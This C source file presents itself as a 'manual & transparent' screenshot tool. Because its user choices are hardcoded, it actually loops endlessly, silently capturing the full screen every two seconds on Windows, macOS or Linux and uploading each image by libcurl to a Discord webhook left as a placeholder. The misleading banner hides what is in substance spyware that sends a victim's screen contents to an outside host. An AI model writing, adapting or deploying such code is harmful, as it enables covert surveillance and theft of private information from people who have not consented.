#include <stdio.h>
#include <stdlib.h>
#include <string.h>
#include <curl/curl.h>

#ifdef _WIN32
    #include <windows.h>
    #define SLEEP(ms) Sleep(ms)
#else
    #include <unistd.h>
    #define SLEEP(ms) usleep((ms) * 1000)
#endif

void take_screenshot() {
#ifdef _WIN32
    system(
        "powershell -command \""
        "Add-Type -AssemblyName System.Windows.Forms;"
        "Add-Type -AssemblyName System.Drawing;"
        "$bmp = New-Object Drawing.Bitmap([System.Windows.Forms.Screen]::PrimaryScreen.Bounds.Width,"
        "[System.Windows.Forms.Screen]::PrimaryScreen.Bounds.Height);"
        "$graphics = [Drawing.Graphics]::FromImage($bmp);"
        "$graphics.CopyFromScreen(0,0,0,0,$bmp.Size);"
        "$bmp.Save([Environment]::GetFolderPath('UserProfile') + '\\Downloads\\screenshot.png');"
        "\""
    );

#elif __APPLE__
    system("screencapture -x ~/Downloads/screenshot.png");

#elif __linux__
    system("import -window root ~/Downloads/screenshot.png");

#else
    printf("Unsupported OS\n");
#endif
}

void get_filepath(char *buffer, size_t size) {
#ifdef _WIN32
    char userprofile[MAX_PATH];
    GetEnvironmentVariableA("USERPROFILE", userprofile, MAX_PATH);
    snprintf(buffer, size, "%s\\Downloads\\screenshot.png", userprofile);
#else
    const char *home = getenv("HOME");
    snprintf(buffer, size, "%s/Downloads/screenshot.png", home);
#endif
}

void send_screenshot() {
    char filepath[512];
    get_filepath(filepath, sizeof(filepath));

    printf("Uploading screenshot to Discord webhook...\n");
    printf("File: %s\n", filepath);

    CURL *curl = curl_easy_init();
    if (!curl) {
        printf("Failed to init curl\n");
        return;
    }

    curl_mime *form = curl_mime_init(curl);
    curl_mimepart *field = curl_mime_addpart(form);

    curl_mime_name(field, "file");
    curl_mime_filedata(field, filepath);

    curl_easy_setopt(curl, CURLOPT_URL,
        "WEBHOOK_HERE");

    curl_easy_setopt(curl, CURLOPT_MIMEPOST, form);

    CURLcode res = curl_easy_perform(curl);

    if (res != CURLE_OK) {
        printf("Upload failed: %s\n", curl_easy_strerror(res));
    } else {
        printf("Upload successful.\n");
    }

    curl_mime_free(form);
    curl_easy_cleanup(curl);
}

int main() {
    int choice;

    curl_global_init(CURL_GLOBAL_DEFAULT);

    printf("Screenshot tool (manual & transparent)\n");

    while (1) {
        choice = 1;
        if (choice == 1) {
            take_screenshot();
            printf("Screenshot saved to Downloads.\n");

            int upload;
            upload = 1;
            if (upload == 1) {
                send_screenshot();
            } else {
                printf("Upload skipped.\n");
            }
        }
        else if (choice == 0) {
            printf("Skipped.\n");
        }
        else {
            printf("Exiting...\n");
            break;
        }

        SLEEP(2000);
    }

    curl_global_cleanup();
    return 0;
}
